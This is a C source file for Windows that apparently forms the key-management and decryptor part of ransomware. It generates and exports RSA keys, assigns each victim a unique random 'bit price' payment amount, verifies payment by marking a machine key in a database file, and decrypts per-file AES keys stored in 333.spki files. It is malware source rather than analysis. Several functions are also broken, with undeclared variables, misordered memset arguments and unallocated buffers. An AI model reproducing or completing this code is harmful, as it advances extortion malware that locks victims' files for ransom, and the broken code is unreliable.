#include "crypt.h"
#include "common.h"

void print_byte(PBYTE data, DWORD size) {
	for (DWORD i = 0; i < size; ++i) {
		printf("0x%02x, ", data[i]);
		if ((i + 1) % 10 == 0) putchar('\n');
	}
}
void print_error(const char* e, NTSTATUS x) {
	printf("Error! %s with code: 0x%x\n", e, x);
	switch (x) {
	case NTE_BAD_FLAGS:
		printf("NTE_BAD_FLAGS\n");
		break;
	case NTE_INVALID_HANDLE:
		printf("NTE_INVALID_HANDLE\n");
		break;
	case NTE_INVALID_PARAMETER:
		printf("NTE_INVALID_PARAMETER\n");
		break;
	case NTE_NO_MEMORY:
		printf("NTE_NO_MEMORY\n");
		break;
	case NTE_NOT_SUPPORTED:
		printf("NTE_NOT_SUPPORTED\n");
		break;
	case NTE_BAD_KEY_STATE:
		printf("NTE_BAD_KEY_STATE\n");
		break;
	case NTE_BAD_TYPE:
		printf("NTE_BAD_TYPE\n");
		break;
	default:
		printf("Unknown Error.\n");
	}
}
bool generate_asymmetric_key(NCRYPT_PROV_HANDLE* handle, NCRYPT_KEY_HANDLE* key, LPCWSTR name) {
	NTSTATUS status;
	DWORD ret, len = 128;

	if (*handle) NCryptFreeObject(*handle);
	if (*key) NCryptDeleteKey(*key, NCRYPT_SILENT_FLAG);

	if (!NT_SUCCESS(status = NCryptOpenStorageProvider(handle, NULL, 0))) {
		print_error("NCryptOpenStorageProvider failed", status);
		goto end;
	}
	if (!NT_SUCCESS(status = NCryptCreatePersistedKey(*handle, key, L"RSA", NULL, 0, 0))) {
		print_error("NCryptCreatePersistedKey failed", status);
		goto end;
	}
	/*if (!NT_SUCCESS(status = NCryptSetProperty(*key, NCRYPT_BLOCK_LENGTH_PROPERTY, (PBYTE)&len, sizeof(DWORD), &ret, NCRYPT_SILENT_FLAG))) {
		print_error("NCryptSetProperty failed", status);
		goto end;
	}*/
	if (!NT_SUCCESS(status = NCryptFinalizeKey(*key, NCRYPT_SILENT_FLAG))) {
		print_error("NCryptFinalizeKey failed", status);
		goto end;
	}
	return true;
end:
	if (handle) NCryptFreeObject(*handle);
	if (key) NCryptDeleteKey(*key, NCRYPT_SILENT_FLAG);
	return false;
}
bool decrypt_buff(NCRYPT_KEY_HANDLE* key, DWORD inbuff_size, LPVOID inbuff, DWORD* outbuff_size, LPVOID outbuff) {
	NTSTATUS status = 0;
	DWORD res = 0;
	if (!NT_SUCCESS(status = NCryptDecrypt(*key, (PBYTE)inbuff, inbuff_size, NULL, NULL, NULL, &res, NCRYPT_PAD_PKCS1_FLAG))) {
		print_error("NCryptDecrypt1 failed", status);
		return false;
	}
	if (res > * outbuff_size) {
		*outbuff_size = res;
		return true;
	}
	if (!NT_SUCCESS(status = NCryptDecrypt(*key, (PBYTE)inbuff, inbuff_size, NULL, outbuff, *outbuff_size, &res, NCRYPT_PAD_PKCS1_FLAG))) {
		print_error("NCryptDecrypt2 failed", status);
		return false;
	}
	*outbuff_size = res;
	return true;
}
bool export_key(NCRYPT_KEY_HANDLE* key) {
	NTSTATUS status;
	HANDLE file = NULL;
	DWORD flg = NCRYPT_ALLOW_EXPORT_FLAG | NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG;
	DWORD res = NULL;
	DWORD len = NULL;
	LPVOID buff = NULL;
	char wr[15];


	if (!NT_SUCCESS(status = NCryptSetProperty(*key, NCRYPT_EXPORT_POLICY_PROPERTY, (PBYTE)&flg, sizeof(flg), 0))) {
		print_error("NCryptSetProperty failed", status);
		goto end;
	}
	if (!NT_SUCCESS(status = NCryptExportKey(*key, NULL, BCRYPT_RSAFULLPRIVATE_BLOB, NULL, NULL, 0, &res, 0))) {
		print_error("NCryptExportKey1 failed", status);
		goto end;
	}
	buff = HeapAlloc(GetProcessHeap(), 0, res);
	if (buff == NULL) {
		printf("buff allocation failed.\n");
		goto end;
	}
	if (!NT_SUCCESS(status = NCryptExportKey(*key, NULL, BCRYPT_RSAFULLPRIVATE_BLOB, NULL, buff, res, &len, 0))) {
		print_error("NCryptExportKey2 failed", status);
		goto end;
	}
	if (len != res) {
		printf("len = %lu, res = %lu", len, res);
		goto end;
	}
	file = CreateFile("key.txt", GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		printf("key.txt failed to open.\n");
		goto end;
	}
	for (int i = 0; i < res; ++i) {
		memset(wr, 0, 15);
		//snprintf(wr, 1, "%c", ((PBYTE)buff)[i]);
		WriteFile(file, &((PBYTE)buff)[i], 1, &len, 0);
	}
	CloseHandle(file);
	memset(buff, 0, res);
	HeapFree(GetProcessHeap(), 0, buff);
	buff = NULL;

	file = CreateFile("public_key.txt", GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		printf("public_key.txt failed to open.\n");
		goto end;
	}
	if (!NT_SUCCESS(status = NCryptExportKey(*key, NULL, BCRYPT_RSAPUBLIC_BLOB, NULL, NULL, 0, &res, 0))) {
		print_error("NCryptExportKey1 failed", status);
		goto end;
	}
	buff = HeapAlloc(GetProcessHeap(), 0, res);
	if (buff == NULL) {
		printf("buff allocation failed.\n");
		goto end;
	}
	if (!NT_SUCCESS(status = NCryptExportKey(*key, NULL, BCRYPT_RSAPUBLIC_BLOB, NULL, buff, res, &len, 0))) {
		print_error("NCryptExportKey2 failed", status);
		goto end;
	}
	if (len != res) {
		printf("len = %lu, res = %lu", len, res);
		goto end;
	}
	for (int i = 0; i < res; ++i) {
		memset(wr, 0, 15);
		//snprintf(wr, 7, "0x%02x,", ((PBYTE)buff)[i]);
		WriteFile(file, &((PBYTE)buff)[i], 1, &len, 0);
	}
	memset(buff, 0, res);
	HeapFree(GetProcessHeap(), 0, buff);
	CloseHandle(file);
	return true;
end:
	if (file) CloseHandle(file);
	if (buff) HeapFree(GetProcessHeap(), 0, res);
	return false;
}
bool import_key(NCRYPT_PROV_HANDLE* handle, NCRYPT_KEY_HANDLE* key, DWORD buffer_size, LPVOID buffer, LPCWSTR type) {
	HANDLE file = 0;
	DWORD file_size, ret;
	LPVOID buff = 0;
	NTSTATUS status;

	if (*handle) NCryptFreeObject(*handle);
	if (*key) NCryptDeleteKey(*key, NCRYPT_SILENT_FLAG);

	if (buffer == NULL || buffer_size == 0) {
		if (type == BCRYPT_RSAPUBLIC_BLOB)
			file = CreateFile("public_key.txt", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		else if (type == BCRYPT_RSAPRIVATE_BLOB)
			file = CreateFile("key.txt", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (file == INVALID_HANDLE_VALUE) {
			printf("key.txt failed to open.\n");
			goto end;
		}

		file_size = GetFileSize(file, 0);
		buff = HeapAlloc(GetProcessHeap(), 0, file_size);
		if (buff == 0) {
			printf("buff memory allocation failed - file size %d.\n", file_size);
			goto end;
		}
		if (ReadFile(file, buff, file_size, &ret, NULL) == 0) {
			printf("readfile failed with code: %lu\n", GetLastError());
			goto end;
		}
	}
	else {
		buff = buffer;
		ret = buffer_size;
	}
	if (!NT_SUCCESS(status = NCryptOpenStorageProvider(handle, NULL, 0))) {
		print_error("NCryptOpenStorageProvider", status);
		goto end;
	}
	if (!NT_SUCCESS(status = NCryptImportKey(*handle, NULL, type, NULL, key, (PBYTE)buff, ret, NCRYPT_SILENT_FLAG))) {
		print_error("NCryptImportKey failed", status);
		goto end;
	}
	if (file) CloseHandle(file);
	return true;
end:
	if (buff) HeapFree(GetProcessHeap(), 0, buff);
	if (file) CloseHandle(file);
	return false;
}
int get_bit_price(char* price) {
	unsigned int random = 0;
	unsigned int snumber = 0;
	char number[10];
	HANDLE file = NULL;
	LPVOID read = NULL;
	DWORD size = 0;

	//max = 09999999
	//min = 03000000

	memset(price, 0, 10 * sizeof(char));

	file = CreateFile("pbit", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		printf("failed to open/create pbit %lu\n", GetLastError());
		return 0;
	}
	size = GetFileSize(file, NULL);
	if (size != 0) {
		read = HeapAlloc(GetProcessHeap(), 0, size);
		if (read != NULL) {
			if (!ReadFile(file, read, size, &size, NULL)) {
				printf("ReadFile failed in get_bit_price %lu\n", GetLastError());
				return 0;
			}
		}
	}
	int i;
	while (1) {

		rand_s(&random);

		random = random % 3000000;

		random = random + (9999999 - 3000000);

		memset(number, 0, 10 * sizeof(char));
		_itoa(random, number, 10);

		if (size != 0) {
			for (i = 0; i < size; ++i) {
				if (((PBYTE)read)[i] == number[0]) {
					if (memcmp(&((char*)read)[i], number, strlen(number)) == 0) {
						break;
					}
				}
			}
			if (i == size) break;
		}
		else break;
	}

	memcpy(price, "000", 9 - strlen(number));
	memcpy(&price[9 - strlen(number)], number, strlen(number));

	if (!WriteFile(file, price, strlen(price), &size, NULL)) {
		printf("Write file failed in get_bit_price %lu\n", GetLastError());
		return 0;
	}
	if (!WriteFile(file, "\r\n", 2, &size, NULL)) {
		printf("Write file failed in get_bit_price %lu\n", GetLastError());
		return 0;
	}
	CloseHandle(file);
	return 1;
}
int verify_payment(char* bit_price, bool fwrite) {
	HANDLE file = NULL;
	DWORD file_size = 0, ret = 0;
	char size[4];
	LPVOID read_file = NULL, write_file = NULL;

	file = CreateFile("key", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		printf("failed to open key in verify_payment %lu\n", GetLastError());
		return false;
	}
	file_size = GetFileSize(file, NULL);
	read_file = HeapAlloc(GetProcessHeap(), NULL, file_size);
	if (read_file == NULL) {
		printf("failed to allocate read_file in verify_payment %lu\n", GetLastError());
		return false;
	}
	if (!ReadFile(file, read_file, file_size, &ret, NULL)) {
		printf("failed to read file in verify_payment %lu\n", GetLastError());
		return false;
	}
	if (file_size != ret) {
		puts("could not read the whole content, close any program that has open handle to key the try again\n");
		return false;
	}
	int i, j;

	if (fwrite) {
		for (i = 0; i < ret; ++i) {
			if (((PBYTE)read_file)[i] == bit_price[0]) {
				if (memcmp(&((PBYTE)read_file)[i], bit_price, 9) == 0) {
					for (j = i; j >= 0; --j) {
						if (((PBYTE)read_file)[j] == 'R') {
							if (memcmp(&((PBYTE)read_file)[j], "RSA3", 4) == 0) {
								HANDLE cfile = CreateFile("decrypt.spki", GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
								if (cfile == INVALID_HANDLE_VALUE) {
									HeapFree(GetProcessHeap(), 0, read_file);
									return 0;
								}
								write_file = HeapAlloc(GetProcessHeap(), 0, 603);
								if (write_file == NULL) return 0;
								memcpy(write_file, &((PBYTE)read_file)[j], 603);
								if (!WriteFile(cfile, write_file, 603, &file_size, NULL)) {
									HeapFree(GetProcessHeap(), 0, read_file);
									return 0;
								}
								CloseHandle(cfile);
							}
						}
					}
				}
			}
		}
		CloseHandle(file);
		HeapFree(GetProcessHeap(), 0, read_file);
		return 1;
	}
	for (i = 0; i < ret; ++i) {
		if (((PBYTE)read_file)[i] == bit_price[0]) {
			if (memcmp(&((PBYTE)read_file)[i], bit_price, 9) == 0) {
				for (j = i; j >= 0; --j) {
					if (((PBYTE)read_file)[j] == 'y') {
						if (memcmp(&((PBYTE)read_file)[j - 11], "+machine_key", 11) == 0) {
							((PBYTE)read_file)[j - 11] = '*';
							goto done;
						}
						else if (memcmp(&((PBYTE)read_file)[j - 11], "*machine_key", 11) == 0) {
							HeapFree(GetProcessHeap(), 0, read_file);
							CloseHandle(file);
							return 2;
						}
					}
				}
			}
		}
	}
done:
	CloseHandle(file);
	if (i == file_size) {
		HeapFree(GetProcessHeap(), 0, read_file);
		return 3;
	}
	file = CreateFile("tkey", GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!WriteFile(file, read_file, ret, &ret, NULL)) {
		printf("failed to write to file in verify_payment %lu\n", GetLastError());
		return false;
	}
	CloseHandle(file);
	file = CreateFile("key", GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!WriteFile(file, read_file, ret, &ret, NULL)) {
		printf("failed to write to file in verify_payment %lu\n", GetLastError());
		return false;
	}
	CloseHandle(file);
	DeleteFile("tkey");
	HeapFree(GetProcessHeap(), 0, read_file);
	return true;
}
bool decrypt_one_file() {
	char file_loc[MAX_PATH], dir[MAX_PATH], file3_loc[MAX_PATH], file5_loc[MAX_PATH], *pos = NULL;
	LPVOID read_file = NULL, read_file3 = NULL, read_file5 = NULL, tmp = NULL;
	DWORD file_size = 0, file3_size = 0, file5_size = 0, len = 0, do_more = 0;
	HANDLE handle = INVALID_HANDLE_VALUE, file3_handle = INVALID_HANDLE_VALUE, file5_handle = INVALID_HANDLE_VALUE, file_t = INVALID_HANDLE_VALUE;
	pAES_KEY_DIR act;
	NTSTATUS status;

	memset(file_loc, MAX_PATH, 0);
	memset(dir, MAX_PATH, 0);
	memset(file3_loc, MAX_PATH, 0);
	memset(file5_loc, MAX_PATH, 0);
	
	printf("Enter file location\n");
	fgets(file_loc, MAX_PATH, stdin);

	pos = strchr(file_loc, '\n');
	if (pos != NULL) memset(pos, '\0', 1);

	if ((handle = CreateFileA(file_loc, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("Error! CreateFileA file_loc failed with code: %lu\n", GetLastError());
		system("PAUSE");
		goto cleanup;
	}

	file_size = GetFileSize(handle, NULL);
	read_file = HeapAlloc(GetProcessHeap(), 0, file_size);
	if (read_file == NULL) {
		printf("failed to allocate read_file %lu. size:  %lu\n", GetLastError(), file_size);
		system("PAUSE");
		goto cleanup;
	}
	if (!ReadFile(handle, read_file, file_size, &file_size, NULL)) {
		printf("Error! ReadFile read_file failed with code %lu\n", GetLastError());
		system("PAUSE");
		goto cleanup;
	}

	for (int i = strlen(file_loc); i > 0; --i) {
		if (file_loc[i] == '\\') {
			snprintf(dir, i, "%s", file_loc);
			memcpy(&dir[i - 1], "\\*", 3);
			
			snprintf(file3_loc, i, "%s", file_loc);
			memcpy(&file3_loc[i - 1], "\\333.spki", 9);
			
			snprintf(file5_loc, i, "%s", file_loc);
			memcpy(&file5_loc[i - 1], "\\55555.dpki", 11);
			break;
		}
	}

	if ((file3_handle = CreateFileA(file3_loc, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("Enter 333.spki file location\n");
		fgets(file3_loc, MAX_PATH, stdin);
		pos = strchr(file3_loc, '\n');
		if (pos != NULL) memset(pos, '\0', 1);
		
		if ((file3_handle = CreateFileA(file3_loc, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
			printf("Error! CreateFileA failed with code: %lu\n", GetLastError());
			system("PAUSE");
			goto cleanup;
		}
	}
	if ((file5_handle = CreateFileA(file5_loc, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("Enter 55555.spki file location\n");
		fgets(file5_loc, MAX_PATH, stdin);
		pos = strchr(file5_loc, '\n');
		if (pos != NULL) memset(pos, '\0', 1);

		if ((file5_handle = CreateFileA(file5_loc, GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
			printf("Error! CreateFileA failed with code: %lu\n", GetLastError());
			system("PAUSE");
			goto cleanup;
		}
	}

	file3_size = GetFileSize(file3_handle, NULL);
	read_file3 = HeapAlloc(GetProcessHeap(), NULL, file3_size);
	if (read_file3 == NULL) {
		printf("HeapAlloc read_file3 failed %lu\n", GetLastError());
		system("PAUSE");
		goto cleanup;
	}
	
	file5_size = GetFileSize(file5_handle, NULL);
	read_file5 = HeapAlloc(GetProcessHeap(), NULL, file5_size);
	if (read_file5 == NULL) {
		printf("HeapAlloc read_file5 failed %lu\n", GetLastError());
		system("PAUSE");
		goto cleanup;
	}

	if (!ReadFile(file3_handle, read_file3, file3_size, &read_file3, NULL)) {
		printf("Error! ReadFile read_file3 failed with code %lu\n", GetLastError());
		system("PAUSE");
		goto cleanup;
	}
	if (!ReadFile(file5_handle, read_file5, file5_size, &read_file5, NULL)) {
		printf("Error! ReadFile read_file5 failed with code %lu\n", GetLastError());
		system("PAUSE");
		goto cleanup;
	}
	
	
	// import asymmetric key using ip or bit price by finding it in the database file
	// decrpyt the keys in 333.spki and fill the AES_KEY_DIR structure.
	// travers the structure and look for the path, if found take the desired key and decrypt the file.
	// delete 55555.spki related stuff. Not needed
	
	
	len = (sizeof(AES_KEY_DIR) / 100 + 1) * 128;
	char* encrypted = (char*)malloc(len * sizeof(char));

	act = (pAES_KEY_DIR)malloc((file_size / len) * sizeof(AES_KEY_DIR));
	DWORD ofset = 0;
	printf("decrypting keys saved in 333.spki\n");
	for (int i = 0; i < file_size / len; ++i) {
		memcpy(encrypted, LPVOID((DWORD)read_file3 + i * len), len);
		decrypt_size = len;
		do_more = ofset = 0;
		while (1) {
			if (decrypt_size > 128) {
				memcpy(tmp, (LPVOID)((DWORD)encrypted + do_more * 128), 128);
				++do_more;
			}
			else {
				memcpy(tmp, (LPVOID)((DWORD)encrypted + do_more * 128), decrypt_size);
				do_more = 0;
			}
			if (!NT_SUCCESS(status = NCryptDecrypt(key, (PBYTE)tmp, decrypt_size > 128 ? 128 : decrypt_size, NULL, NULL, NULL, & ret, NCRYPT_PAD_PKCS1_FLAG))) {
				print_error("NCryptDecrypt1 failed", status);
				break;
			}
			if (!NT_SUCCESS(status = NCryptDecrypt(key, (PBYTE)tmp, decrypt_size > 128 ? 128 : decrypt_size, NULL, (PBYTE)((DWORD)&act[i] + ofset), ret, & ret, NCRYPT_PAD_PKCS1_FLAG))) {
				print_error("NCryptDecrypt2 failed", status);
				break;
			}
			ofset += ret;
			if (do_more == 0) break;
			decrypt_size -= 128;
		}
	}




	if (handle != INVALID_HANDLE_VALUE) CloseHandle(handle);
	if (file3_handle != INVALID_HANDLE_VALUE) CloseHandle(file3_handle);
	if (file5_handle != INVALID_HANDLE_VALUE) CloseHandle(file5_handle);

	if (read_file) HeapFree(GetProcessHeap(), NULL, read_file);
	if (read_file3) HeapFree(GetProcessHeap(), NULL, read_file3);
	if (read_file5) HeapFree(GetProcessHeap(), NULL, read_file5);
	return true;
cleanup:
	if (handle != INVALID_HANDLE_VALUE) CloseHandle(handle);
	if (file3_handle != INVALID_HANDLE_VALUE) CloseHandle(file3_handle);
	if (file5_handle != INVALID_HANDLE_VALUE) CloseHandle(file5_handle);

	if (read_file) HeapFree(GetProcessHeap(), NULL, read_file);
	if (read_file3) HeapFree(GetProcessHeap(), NULL, read_file3);
	if (read_file5) HeapFree(GetProcessHeap(), NULL, read_file5);
	return false;
}